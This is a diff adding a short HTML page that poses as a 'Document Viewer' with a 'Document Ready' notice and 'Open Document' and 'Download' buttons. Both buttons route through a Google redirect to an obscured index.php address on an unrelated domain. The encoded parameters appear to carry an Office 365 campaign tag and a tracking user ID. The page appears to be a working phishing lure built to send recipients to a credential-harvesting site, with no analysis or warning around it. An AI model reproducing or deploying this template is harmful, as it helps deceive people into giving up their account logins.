@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Document Viewer</title>
+  <meta name="description" content="View or download the document" />
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      background-color: #ffffff;
+      color: #1a1a1a;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .card {
+      max-width: 28rem;
+      text-align: center;
+      padding: 2rem;
+      background: white;
+      border-radius: 0.75rem;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+    }
+    .icon {
+      width: 4rem;
+      height: 4rem;
+      margin-bottom: 1rem;
+    }
+    h1 {
+      font-size: 1.25rem;
+      margin-bottom: 0.5rem;
+    }
+    p {
+      color: #6b7280;
+      font-size: 0.875rem;
+      margin-bottom: 1.5rem;
+    }
+    .btn {
+      display: inline-block;
+      padding: 0.6rem 1.25rem;
+      margin: 0.25rem;
+      border-radius: 0.375rem;
+      font-size: 0.875rem;
+      font-weight: 600;
+      cursor: pointer;
+      border: none;
+      transition: transform 0.2s ease;
+    }
+    .btn:hover {
+      transform: scale(1.05);
+    }
+    .btn-primary {
+      background-color: #2563eb;
+      color: white;
+    }
+    .btn-secondary {
+      background-color: transparent;
+      color: #1a1a1a;
+      border: 2px solid #e5e7eb;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <img class="icon" src="https://cdn-icons-png.flaticon.com/512/337/337946.png" alt="PDF Icon" />
+    <h1>Document Ready</h1>
+    <p>Click below to view or download the document.</p>
+    <div>
+      <a class="btn btn-primary" 
+         href="https://www.google.com/url?q=https%3A%2F%2Fnhotelsresidences.com%2Fo%2Findex.php%3Fc3Y9bzM2NV8xX25vbSZtPXVyJnVpZD1VU0VSMDQwMTIwMjZVMzAwMTA0MTUmdD1kSg%3D%3DN0123N&sa=D&sntz=1&usg=AOvVaw3dZgIR4c-fS34Gx9e6Rc2L" 
+         target="_blank">
+         Open Document
+      </a>
+      <a class="btn btn-secondary" 
+         href="https://www.google.com/url?q=https%3A%2F%2Fnhotelsresidences.com%2Fo%2Findex.php%3Fc3Y9bzM2NV8xX25vbSZtPXVyJnVpZD1VU0VSMDQwMTIwMjZVMzAwMTA0MTUmdD1kSg%3D%3DN0123N&sa=D&sntz=1&usg=AOvVaw3dZgIR4c-fS34Gx9e6Rc2L" 
+         download>
+         Download
+      </a>
+    </div>
+  </div>
+</body>
+</html>
